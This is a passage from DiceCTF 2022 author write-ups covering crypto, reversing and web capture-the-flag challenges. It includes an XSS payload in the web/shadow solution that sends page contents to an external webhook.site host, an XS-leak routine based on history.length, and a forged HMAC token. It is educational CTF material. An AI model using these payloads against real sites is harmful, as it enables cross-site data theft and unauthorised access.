gates. So the longest chain of gates in the circuit which contains no CNOT gates is the adder. This is the only component which you need to statically analyze. You can determine this by reading about how the QFT works, or by looking at the generate.py script from last year's challenges. The following solution is essentially a quantum disassembler. For each single-qubit chain of H and T gates, it multiplies the gates together to determine what the quantum operator is. Then it determines that the corresponding Z-rotation angle is for this operator. Once all the rotation angles have been recovered, extracting the number being added (ie the flag) proceeds identically to quantum-rev 2 from last year . from math import pi, log2 import numpy as np # hadamard gate H = 1/np.sqrt(2)*np.array([[1, 1], [1,-1]], dtype=np.complex128) # T-phase gate T = np.array([[1, 0], [0, np.exp(1j * pi/4)]], dtype=np.complex128) # identity operator I = np.array([[1, 0], [0, 1]], dtype=np.complex128) ######################################## # num qubits n = 256 # max error epsilon = 1e-4 \"\"\" look for the start/end of the QFT. This includes a few extra gates (from the QFT) for qubit 0 and 1, so we just ignore those \"\"\" idcs = [] with open(\"converted_circuit.qasm\", \"r\") as f: for i,line in enumerate(f): if line == \"cx q[1],q[0];\\n\": idcs.append(i) # print(i) i0 = idcs[1] i1 = idcs[2] lines = open(\"converted_circuit.qasm\", \"r\").readlines() idcs = [i for i,line in enumerate(lines)] gates = lines[i0 + 1:i1 - 1] ######################################## unitaries = [I for _ in range(n)] for line in gates: instr = line[0] qubit = line[line.find(\"[\")+1:line.find(\"]\")] qubit = int(qubit) i = qubit if instr == 't': unitaries[i] = unitaries[i] @ T elif instr == 'h': unitaries[i] = unitaries[i] @ H else: raise ValueError(\"invalid gate\") # correct for QFT spillover for i in range(3): unitaries[i] = I ######################################## binary_reprs = \"\" unitaries = unitaries for i,u in enumerate(unitaries): delta = np.abs(u) - I if np.max(np.abs(delta)) > epsilon: raise ValueError(\"unitary is not approximately a phase gate\") u /= u[0][0] angle = np.angle(u[1][1]) b = str(int(angle < 0)) binary_reprs += b flag = int(binary_reprs[::-1], 2).to_bytes(n//8, \"little\") # first character is wrong b/c we included some extra QFT gates lol flag = b\"d\" + flag[1:] print(flag) However, during the competition the only solves were from a very amusing approach -- just run the program and it prints out the flag! Apparently the circuit simulator used in qiskit is able to very efficiently emulate the circuit in this problem without ever constructing the full statevector. The statevector has length 2^256 , so I had assumed that classically simulating the output would be completely impossible. Clearly, the IBM engineers and scientists behind qiskit deserve a raise >_<. The runtime of the below script for me is 45 minutes and it takes < 4 gigs of ram -- much less than 2^256! from qiskit import QuantumCircuit, Aer, execute simulator = Aer.get_backend('aer_simulator') qc = QuantumCircuit.from_qasm_file(\"converted_circuit.qasm\") # add some measurement gates at the end qubits = list(range(256)) qc.measure(qubits, qubits) job = execute(qc, simulator) result = job.result() print(result.get_counts()) num_chars = 256 // 8 x = list(result.get_counts().keys())[0] f = int(x, 2).to_bytes(num_chars, \"little\") print(f) web/knock-knock This challenge gives a pastebin where notes are accessed by id and token . The tokens are generated as follows: generateToken(id) { return crypto .createHmac('sha256', this.secret) .update(id.toString()) .digest('hex'); } This looks okay, as long as the secret is chosen securely. Let's take a look at where that comes from: constructor() { this.notes = []; this.secret = `secret-${crypto.randomUUID}`; } If you are careful, you can spot the issue here: crypto.randomUUID is a function, but it is not called. Let's see what this looks like: > const crypto = require('crypto') undefined > const secret = `secret-${crypto.randomUUID}`; undefined > secret 'secret-function randomUUID(options) {\\n' + ' if (options !== undefined)\\n' + \" validateObject(options, 'options');\\n\" + ' const {\\n' + ' disableEntropyCache = false,\\n' + ' } = options || {};\\n' + '\\n' + \" validateBoolean(disableEntropyCache, 'options.disableEntropyCache');\\n\" + '\\n' + ' return disableEntropyCache ? getUnbufferedUUID() : getBufferedUUID();\\n' + '}' > Well, it looks like we know the secret. Looking at the source, we see that the flag is at id=0 , so we generate a token for that: > crypto.createHmac('sha256', secret).update('0').digest('hex') '7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264' Making a request to https://knock-knock.mc.ax/note?id=0&token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264 gives us the flag. web/dicevault tl;dr use a combination of history.go(-x) and undocumented history.length xsleak to guess the location of a window and brute force flag path directory-by-directory. unintended: open vault window, redirect to your origin and get it to click vault buttons on your origin :( async function isLocation(win, url) { win.location = \"about:blank\"; await sleep(); const hlen1 = win.history.length; win.history.go(-1); await sleep(); win.location = url + \"#zzzzz\"; win.location = \"about:blank\"; await sleep(); const hlen2 = win.history.length; // reset history to initial state before running this function if (hlen1 + 1 === hlen2) { win.history.go(-2); } else if (hlen1 === hlen2) { win.history.go(-1); } return hlen1 + 1 === hlen2; } web/shadow full solution: https://shadow.mc.ax/?x=%3Cimg%20src%3D%22x%22%20onerror%3D%22find(%27steal%27)%3Bdocument.execCommand(%27insertHTML%27%2C%20false%2C%20%60%3Csvg%20onload%3D%26%2334%3Bwindow.location%3D%27https%3A%2F%2Fwebhook.site%2Fa602d76c-28a3-4e0a-8793-b183bc9bfba4%3Fa%3D%27%2BencodeURIComponent(this.parentNode.innerHTML)%26%2334%3B%3E%60)%3B%22%3E&y=-webkit-user-modify:%20read-write; css payload: -webkit-user-modify: read-write; js payload: find('steal'); document.execCommand('insertHTML', false, `<svg onload=\"window.location='https://webhook.site/a602d76c-28a3-4e0a-8793-b183bc9bfba4?a='+encodeURIComponent(this.parentNode.innerHTML)\">`); Use the obscure -webkit-user-modify property to make the div inside the shadowDOM editable then document.execCommand(\"insertHTML\",\"payload\") to write HTML inside it and get code execution inside the shadowDOM context. We can easily exfiltrate despite the CSP by setting window.location rev/typed Here's the original version of the code before macro expansion (and with the flag added in): #![recursion_limit = \"10000\"] // #![allow(dead_code, unused_macros)] use std::marker::PhantomData; macro_rules! mktype { ($name: ident) => { struct $name; }; ($name: ident<$($t: ident),*>) => { struct $name<$($t),*>($(PhantomData<$t>),*); } } macro_rules! mktrait { ($name: ident) => { trait $name { type Output; } }; ($name: ident<$($arg: ident),*>) => { trait $name<$($arg),*> { type Output; } } } macro_rules! mkimpl { ($name: ident<$($gen: ident),*>[$($cgen: ty : $cons: path),*]($firstarg: ty $(, $arg: ty)*) = $output: ty) => { impl<$($gen),*> $name<$($arg),*> for $firstarg where $($cgen: $cons),* { type Output = $output; } } } macro_rules! mkout { ($name: ident, $firstarg: ty $(, $arg: ty)*) => { <$firstarg as $name<$($arg),*>>::Output } } mktype!(S<T>); mktype!(Z); mktrait!(Add<O>); mkimpl!(Add<T>[](T, Z) = T); mkimpl!(Add<T, K>[T: Add<K>](T, S<K>) = S<mkout!(Add, T, K)>); mktrait!(Mul<O>); mkimpl!(Mul<T>[](T, Z) = Z); mkimpl!(Mul<T, K>[T: Mul<K>, T: Add<mkout!(Mul, T, K)>](T, S<K>) = mkout!(Add, T, mkout!(Mul, T, K))); mktrait!(Sub<O>); mkimpl!(Sub<T>[](T, Z) = T); mkimpl!(Sub<T, K>[T: Sub<K>](S<T>, S<K>) = mkout!(Sub, T, K)); mktrait!(Neq<O>); mkimpl!(Neq<>[](Z, Z) = Z); mkimpl!(Neq<T>[](S<T>, Z) = S<Z>); mkimpl!(Neq<T>[](Z, S<T>) = S<Z>); mkimpl!(Neq<T, K>[T: Neq<K>](S<T>, S<K>) = mkout!(Neq, T, K)); mktype!(Nil); mktype!(Cons<H, T>); macro_rules! mklist { () => { Nil }; ($first: ty $(, $rest: ty)*) => { Cons<$first, mklist!($($rest),*)> } } macro_rules! mkcons { ($first: ty) => { $first }; ($first: ty $(, $rest: ty)*) => { Cons<$first, mkcons!($($rest),*)> } } mktrait!(Eval); macro_rules! mkfunc { ($name: ident) => { mktype!($name); mkimpl!(Eval<>[]($name) = $name); } } mkfunc!(AddFunc); mkfunc!(MulFunc); mkfunc!(SubFunc); mkfunc!(ConsFunc); mkfunc!(RawList); mkfunc!(GetLast); mkfunc!(AssertEq); mkfunc!(AssertNeq); mkfunc!(MapFunc); mkfunc!(MkConstraint); mkfunc!(MkNConstraint); mkfunc!(FirstOf3); mkfunc!(RestOf3); mkfunc!(ApplyFunc); mkimpl!(Eval<>[](Z) = Z); mkimpl!(Eval<T>[](S<T>) = S<T>); mkimpl!(Eval<>[](Cons<RawList, Nil>) = Nil); mkimpl!(Eval<H, T>[H: Eval](Cons<RawList, Cons<H, T>>) = Cons<mkout!(Eval, H), T>); mkimpl!( Eval<A, B>[A: Eval, B: Eval, mkout!(Eval, A): Sub<mkout!(Eval, B)>](mklist!(SubFunc, A, B)) = mkout!(Sub, mkout!(Eval, A), mkout!(Eval, B)) ); mkimpl!(Eval<T>[T: Eval](Cons<GetLast, mklist!(T)>) = mkout!(Eval, T)); mkimpl!( Eval<T, K, R>[mkcons!(GetLast, K, R): Eval, T: Eval](mkcons!(GetLast, T, K, R)) = mkout!(Eval, mkcons!(GetLast, K, R)) ); mkimpl!(Eval<T>[](Cons<AssertEq, mklist!(T)>) = Z); mkimpl!( Eval<T, K, R> [T: Eval, K: Eval, mkout!(Eval, T): Sub<mkout!(Eval, K)>, mkout!(Eval, K): Sub<mkout!(Eval, T)>, mkcons!(AssertEq, K, R): Eval] (mkcons!(AssertEq, T, K, R)) = mkout!(Eval, mkcons!(AssertEq, K, R)) ); mkimpl!( Eval<T, K> [T: Eval, K: Eval, mkout!(Eval, T): Neq<mkout!(Eval, K)>, mkout!(Neq, mkout!(Eval, T), mkout!(Eval, K)): Sub<S<Z>>] (Cons<AssertNeq, mklist!(T, K)>) = Z ); mkimpl!(Eval<F>[](mklist!(MapFunc, F)) = Nil); mkimpl!( Eval<F, H, T> [mklist!(F, H): Eval, mkcons!(MapFunc, F, T): Eval] (mkcons!(MapFunc, F, H, T)) = Cons<mkout!(Eval, mklist!(F, H)), mkout!(Eval, mkcons!(MapFunc, F, T))> ); mkimpl!(Eval<F, A, B, T>[](mklist!(MkConstraint, mklist!(F, A, B, T))) = mklist!(AssertEq, mklist!(F, A, B), T)); mkimpl!(Eval<F, A, B, T>[](mklist!(MkNConstraint, mklist!(F, A, B, T))) = mklist!(AssertNeq, mklist!(F, A, B), T)); mkimpl!(Eval<>[](mklist!(FirstOf3)) = Nil); mkimpl!(Eval<A, B, C, T>[Cons<FirstOf3, T>: Eval](mkcons!(FirstOf3, A, B, C, T)) = Cons<A, mkout!(Eval, Cons<FirstOf3, T>)>); mkimpl!(Eval<>[](mklist!(RestOf3)) = Nil); mkimpl!(Eval<A, B, C, T>[Cons<RestOf3, T>: Eval](mkcons!(RestOf3, A, B, C, T)) = mkcons!(B, C, mkout!(Eval, Cons<RestOf3, T>))); mkimpl!( Eval<F, T>[T: Eval, Cons<F, mkout!(Eval, T)>: Eval](mklist!(ApplyFunc, F, T)) = mkout!(Eval, Cons<F, mkout!(Eval, T)>) ); mkimpl!(Eval<T>[T: Eval](mklist!(ConsFunc, T)) = mkout!(Eval, T)); mkimpl!(Eval<H, T>[Cons<ConsFunc, T>: Eval](mkcons!(ConsFunc, H, T)) = Cons<H, mkout!(Eval, Cons<ConsFunc, T>)>); macro_rules! mkfold { ($fc: ident, $f: ident, $empty: ty, [$t: ident] $one: ty) => { mkimpl!(Eval<>[](mklist!($fc)) = $empty); mkimpl!(Eval<$t>[$t: Eval](mklist!($fc, $t)) = $one); mkimpl!( Eval<H1, H2, T> [H2: Eval, H1: $f<mkout!(Eval, H2)>, mkcons!($fc, mkout!($f, H1, mkout!(Eval, H2)), T): Eval] (Cons<$fc, Cons<H1, Cons<H2, T>>>) = mkout!(Eval, mkcons!($fc, mkout!($f, H1, mkout!(Eval, H2)), T)) ); } } mkfold!(AddFunc, Add, Z, [T] T); mkfold!(MulFunc, Mul, S<Z>, [T] T); type Ten = S<S<S<S<S<S<S<S<S<S<Z>>>>>>>>>>; type Hundred = mkout!(Mul, Ten, Ten); trait AsChar { const CHAR: char; } type Char_ = Z; impl AsChar for Char_ { const CHAR: char = '_'; } type Char0 = S<Z>; impl AsChar for Char0 { const CHAR: char = '0'; } type Char1 = S<S<Z>>; impl AsChar for Char1 { const CHAR: char = '1'; } type Char2 = S<S<S<Z>>>; impl AsChar for Char2 { const CHAR: char = '2'; } type Char3 = S<S<S<S<Z>>>>; impl AsChar for Char3 { const CHAR: char = '3'; } type Char4 = S<S<S<S<S<Z>>>>>; impl AsChar for Char4 { const CHAR: char = '4'; } type Char5 = S<S<S<S<S<S<Z>>>>>>; impl AsChar for Char5 { const CHAR: char = '5'; } type Char6 = S<S<S<S<S<S<S<Z>>>>>>>; impl AsChar for Char6 { const CHAR: char = '6'; } type Char7 = S<S<S<S<S<S<S<S<Z>>>>>>>>; impl AsChar for Char7 { const CHAR: char = '7'; } type Char8 = S<S<S<S<S<S<S<S<S<Z>>>>>>>>>; impl AsChar for Char8 { const CHAR: char = '8'; } type Char9 = mkout!(Add, mkout!(Mul, Ten, S<Z>), Z); impl AsChar for Char9 { const CHAR: char = '9'; } type CharA = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<Z>); impl AsChar for CharA { const CHAR: char = 'a'; } type CharB = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<Z>>); impl AsChar for CharB { const CHAR: char = 'b'; } type CharC = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<Z>>>); impl AsChar for CharC { const CHAR: char = 'c'; } type CharD = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<Z>>>>); impl AsChar for CharD { const CHAR: char = 'd'; } type CharE = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<Z>>>>>); impl AsChar for CharE { const CHAR: char = 'e'; } type CharF = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<S<Z>>>>>>); impl AsChar for CharF { const CHAR: char = 'f'; } type CharG = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<S<S<Z>>>>>>>); impl AsChar for CharG { const CHAR: char = 'g'; } type CharH = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<S<S<S<Z>>>>>>>>); impl AsChar for CharH { const CHAR: char = 'h'; } type CharI = mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<S<S<S<S<Z>>>>>>>>>); impl AsChar for CharI { const CHAR: char = 'i'; } type CharJ = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), Z); impl AsChar for CharJ { const CHAR: char = 'j'; } type CharK = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<Z>); impl AsChar for CharK { const CHAR: char = 'k'; } type CharL = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<Z>>); impl AsChar for CharL { const CHAR: char = 'l'; } type CharM = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<Z>>>); impl AsChar for CharM { const CHAR: char = 'm'; } type CharN = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<Z>>>>); impl AsChar for CharN { const CHAR: char = 'n'; } type CharO = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<Z>>>>>); impl AsChar for CharO { const CHAR: char = 'o'; } type CharP = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<Z>>>>>>); impl AsChar for CharP { const CHAR: char = 'p'; } type CharQ = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<Z>>>>>>>); impl AsChar for CharQ { const CHAR: char = 'q'; } type CharR = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<S<Z>>>>>>>>); impl AsChar for CharR { const CHAR: char = 'r'; } type CharS = mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<S<S<Z>>>>>>>>>); impl AsChar for CharS { const CHAR: char = 's'; } type CharT = mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), Z); impl AsChar for CharT { const CHAR: char = 't'; } type CharU = mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), S<Z>); impl AsChar for CharU { const CHAR: char = 'u'; } type CharV = mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), S<S<Z>>); impl AsChar for CharV { const CHAR: char = 'v'; } type CharW = mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), S<S<S<Z>>>); impl AsChar for CharW { const CHAR: char = 'w'; } type CharX = mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), S<S<S<S<Z>>>>); impl AsChar for CharX { const CHAR: char = 'x'; } type CharY = mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), S<S<S<S<S<Z>>>>>); impl AsChar for CharY { const CHAR: char = 'y'; } type CharZ = mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), S<S<S<S<S<S<Z>>>>>>); impl AsChar for CharZ { const CHAR: char = 'z'; } type Flag0 = CharL; type Flag1 = Char1; type Flag2 = CharS; type Flag3 = CharP; type Flag4 = Char_; type Flag5 = CharI; type Flag6 = CharN; type Flag7 = CharS; type Flag8 = CharI; type Flag9 = CharD; type Flag10 = Char3; type Flag11 = Char_; type Flag12 = CharR; type Flag13 = CharU; type Flag14 = CharS; type Flag15 = Char7; type Flag16 = Char_; type Flag17 = Char9; type Flag18 = CharA; type Flag19 = CharF; type Flag20 = CharH; type Flag21 = Char1; type Flag22 = CharN; type Flag23 = Char2; type Flag24 = Char3; type Constraints = mklist!(mklist!(AddFunc, Flag11, Flag13, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<S<Z>>>>>>>>)), mklist!(MulFunc, Flag1, Flag9, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<S<Z>>>>>>>>)), mklist!(SubFunc, Flag20, Flag4, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<S<S<S<Z>>>>>>>>)), mklist!(SubFunc, Flag0, Flag5, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<Z>>>)), mklist!(SubFunc, Flag3, Flag16, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<Z>>>>>>)), mklist!(SubFunc, Flag12, Flag11, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<S<Z>>>>>>>>)), mklist!(SubFunc, Flag18, Flag17, Z), mklist!(MulFunc, Flag20, Flag11, Z), mklist!(SubFunc, Flag5, Flag9, S<S<S<S<S<Z>>>>>), mklist!(MulFunc, Flag2, Flag4, S<S<S<S<S<Z>>>>>), mklist!(SubFunc, Flag0, Flag15, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<Z>>>>)), mklist!(SubFunc, Flag8, Flag24, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<Z>>>>>)), mklist!(AddFunc, Flag11, Flag7, mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), S<S<S<Z>>>)), mklist!(SubFunc, Flag14, Flag21, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<Z>>>>>>>)), mklist!(MulFunc, Flag4, Flag16, Z), mklist!(MulFunc, Flag21, Flag3, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<S<S<S<S<S<S<S<S<Z>>>>>>>>>)), mklist!(AddFunc, Flag24, Flag16, S<S<S<S<Z>>>>), mklist!(SubFunc, Flag3, Flag0, S<S<S<S<Z>>>>), mklist!(AddFunc, Flag11, Flag10, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<Z>>>)), mklist!(SubFunc, Flag7, Flag15, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<Z>)), mklist!(AddFunc, Flag18, Flag5, mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), Z)), mklist!(MulFunc, Flag18, Flag11, S<S<S<S<S<Z>>>>>), mklist!(SubFunc, Flag7, Flag21, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<Z>>>>>>>)), mklist!(MulFunc, Flag13, Flag18, mkout!(Add, mkout!(Mul, Hundred, S<S<S<Z>>>), mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<Z>))), mklist!(SubFunc, Flag20, Flag15, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<Z>>>)), mklist!(SubFunc, Flag19, Flag23, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<Z>>>)), mklist!(AddFunc, Flag14, Flag20, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<S<S<S<S<S<S<Z>>>>>>>)), mklist!(MulFunc, Flag21, Flag4, mkout!(Add, mkout!(Mul, Ten, S<Z>), Z)), mklist!(AddFunc, Flag10, Flag2, mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), S<S<S<Z>>>)), mklist!(SubFunc, Flag20, Flag10, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<Z>>>>)), mklist!(MulFunc, Flag17, Flag0, mkout!(Add, mkout!(Mul, Hundred, S<S<Z>>), mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<S<S<S<S<Z>>>>>>>>>))), mklist!(SubFunc, Flag22, Flag23, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<Z>)), mklist!(MulFunc, Flag15, Flag18, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<S<S<S<S<Z>>>>>>>>), S<S<S<S<S<S<S<S<Z>>>>>>>>)), mklist!(AddFunc, Flag12, Flag6, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<S<S<S<S<S<Z>>>>>>)), mklist!(MulFunc, Flag22, Flag24, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<S<S<S<S<S<Z>>>>>>>>>), S<S<S<S<S<S<Z>>>>>>)), mklist!(MulFunc, Flag0, Flag23, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<S<S<Z>>>>>>), S<S<S<S<S<S<Z>>>>>>)), mklist!(MulFunc, Flag0, Flag5, mkout!(Add, mkout!(Mul, Hundred, S<S<S<S<Z>>>>), S<S<S<S<S<S<S<S<Z>>>>>>>>)), mklist!(SubFunc, Flag8, Flag11, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<S<S<S<S<Z>>>>>>>>>)), mklist!(AddFunc, Flag19, Flag13, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<S<S<S<S<S<S<Z>>>>>>>)), mklist!(SubFunc, Flag7, Flag12, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<Z>)), mklist!(MulFunc, Flag17, Flag22, mkout!(Add, mkout!(Mul, Hundred, S<S<Z>>), mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), Z))), mklist!(AddFunc, Flag16, Flag14, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<S<S<S<Z>>>>>>>>>)), mklist!(AddFunc, Flag24, Flag18, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<Z>>>>)), mklist!(SubFunc, Flag19, Flag4, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<S<S<S<S<Z>>>>>>)), mklist!(AddFunc, Flag24, Flag3, mkout!(Add, mkout!(Mul, Ten, S<S<S<Z>>>), Z)), mklist!(SubFunc, Flag0, Flag16, mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<Z>>)), mklist!(MulFunc, Flag10, Flag5, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<S<S<S<Z>>>>>>>), S<S<S<S<S<S<Z>>>>>>)), mklist!(SubFunc, Flag20, Flag19, S<S<Z>>), mklist!(MulFunc, Flag12, Flag16, S<S<S<S<S<Z>>>>>), mklist!(MulFunc, Flag24, Flag12, mkout!(Add, mkout!(Mul, Hundred, S<Z>), mkout!(Add, mkout!(Mul, Ten, S<Z>), S<S<Z>>))), mklist!(SubFunc, Flag24, Flag16, S<S<S<S<Z>>>>), mklist!(AddFunc, Flag12, Flag15, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<S<S<S<S<Z>>>>>)), mklist!(AddFunc, Flag1, Flag20, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), Z)), mklist!(MulFunc, Flag1, Flag17, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), Z)), mklist!(AddFunc, Flag5, Flag11, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<S<S<Z>>>>>>)), mklist!(SubFunc, Flag5, Flag18, S<S<S<S<S<S<S<S<Z>>>>>>>>), mklist!(AddFunc, Flag16, Flag22, mkout!(Add, mkout!(Mul, Ten, S<S<Z>>), S<S<S<S<Z>>>>)), mklist!(MulFunc, Flag14, Flag3, mkout!(Add, mkout!(Mul, Hundred, S<S<S<S<S<S<S<Z>>>>>>>), mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<S<S<S<S<S<S<Z>>>>>>>))), mklist!(MulFunc, Flag6, Flag21, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<S<S<S<S<S<S<S<Z>>>>>>>>)), mklist!(AddFunc, Flag6, Flag22, mkout!(Add, mkout!(Mul, Ten, S<S<S<S<Z>>>>), S<S<S<S<S<S<S<S<Z>>>>>>>>))); fn print_flag() { println!(\"dice{{{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}}}\", Flag0::CHAR, Flag1::CHAR, Flag2::CHAR, Flag3::CHAR, Flag4::CHAR, Flag5::CHAR, Flag6::CHAR, Flag7::CHAR, Flag8::CHAR, Flag9::CHAR, Flag10::CHAR, Flag11::CHAR, Flag12::CHAR, Flag13::CHAR, Flag14::CHAR, Flag15::CHAR, Flag16::CHAR, Flag17::CHAR, Flag18::CHAR, Flag19::CHAR, Flag20::CHAR, Flag21::CHAR, Flag22::CHAR, Flag23::CHAR, Flag24::CHAR); } type NConstraints = mklist!(ApplyFunc, MapFunc, mklist!(ConsFunc, MkNConstraint, mkcons!(FirstOf3, Constraints))); type EConstraints = mklist!(ApplyFunc, MapFunc, mklist!(ConsFunc, MkConstraint, mkcons!(RestOf3, Constraints))); type Program = mklist!(GetLast, mklist!(ApplyFunc, GetLast, NConstraints), mklist!(ApplyFunc, GetLast, EConstraints)); type Fin = mkout!(Eval, Program); fn main() { print_flag(); let _: Fin = panic!(); } It essentially creates a lisp-like language, and a list of 60 constraints. The constraints are of the form (flag[i] op flag[j]) cmp x , where op is addition, subtraction, or multiplication, and cmp is either equality or inequality. Every 3rd constraint is inequality and the rest are equality.","title":"DiceCTF 2022 Author Writeups"},{"location":"Writeup/DiceCTF%202022/#dicectf-2022-author-writeups","text":"by ireland / DiceGang","title":"DiceCTF 2022 Author Writeups"},{"location":"Writeup/DiceCTF%202022/#crypto","text":"Challenge name Author Writeup crypto/baby-rsa ireland jump crypto/rejected ireland jump crypto/correlated ireland jump crypto/commitment-issues gripingberry jump crypto/pow-pow defund link crypto/learning without errors ireland jump crypto/shibari ireland jump crypto/psych defund link","title":"Crypto"},{"location":"Writeup/DiceCTF%202022/#misc","text":"Challenge name Author Writeup misc/undefined aplet123 jump misc/sober-bishop clubby789 jump misc/Vinegar kmh TODO misc/TI-1337 Silver Edition kmh TODO misc/Cache On The Side wiresboy TODO misc/5D File System with Multiverse Time Travel poortho TODO","title":"Misc"},{"location":"Writeup/DiceCTF%202022/#pwn","text":"Challenge name Author Writeup pwn/interview-opportunity smoothhacker jump pwn/baby-rop ireland jump pwn/data-eater KyleForkBomb jump pwn/chutes-and-ladders bosh TODO pwn/containment hgarrereyn TODO pwn/memory hole chop0 TODO pwn/nightmare pepsipu jump pwn/road-to-failure NotDeGhost jump","title":"Pwn"},{"location":"Writeup/DiceCTF%202022/#rev","text":"Challenge name Author Writeup rev/flagle infuzion TODO rev/hyperlink BrownieInMotion TODO rev/taxes hgarrereyn TODO rev/dicecraft hgarrereyn TODO rev/cable management evilmuffinha TODO rev/typed aplet123 jump rev/breach hgarrereyn TODO rev/universal ireland jump ]","title":"Rev"},{"location":"Writeup/DiceCTF%202022/#web","text":"Challenge name Author Writeup web/knock-knock BrownieInMotion jump web/blazingfast larry link web/no-cookies BrownieInMotion TODO web/flare larry TODO web/vm-calc Strellic link web/noteKeeper Strellic link web/dicevault arxenix jump web/denoblog Strellic link web/carrot larry TODO web/shadow arxenix jump","title":"Web"},{"location":"Writeup/DiceCTF%202022/#writeups","text":"","title":"Writeups"},{"location":"Writeup/DiceCTF%202022/#cryptobaby-rsa","text":"256-bit RSA where $e^2 | p-1, q-1$. Intended solution = factor $N$ with cado-nfs, then use sage's nth_root() function to get all candidate decryptions. Finally, combine using Chinese Remainder Theorem. The nth_root() algorithm is described in this paper . It's simple for $e | p-1$, but for higher-powers of $e$ involves solving a (small) discrete logarithm problem. Fortunately, sage has it implemented as a built-in. Many resources online describe how to proceed if e | p-1 , but they don't describe the general case for higher powers of e . from Crypto.Util.number import long_to_bytes N = 57996511214023134147551927572747727074259762800050285360155793732008227782157 e = 17 cipher = 19441066986971115501070184268860318480501957407683654861466353590162062492971 # factor with cado-nfs p, q = 172036442175296373253148927105725488217, 337117592532677714973555912658569668821 assert p * q == N p_roots = mod(cipher, p).nth_root(e, all=True) q_roots = mod(cipher, q).nth_root(e, all=True) for xp in p_roots: for xq in q_roots: x = crt([Integer(xp), Integer(xq)], [p,q]) x = int(x) flag = long_to_bytes(x) if flag.startswith(b\"dice\"): print(flag.decode())","title":"crypto/baby-rsa"},{"location":"Writeup/DiceCTF%202022/#cryptorejected","text":"Whenever the RNG has to reroll, then it means that the highest bit of the output is 1 . This lets you launch a known-plaintext attack on the underlying LFSR. Solve the resulting linear system (over GF(2) ) and find the flag. You don't really get much information if the RNG doesn't reroll. A good choice of modulus is (2^32 // 3) + 1 or (2^32 // 4) + 1 , as this will 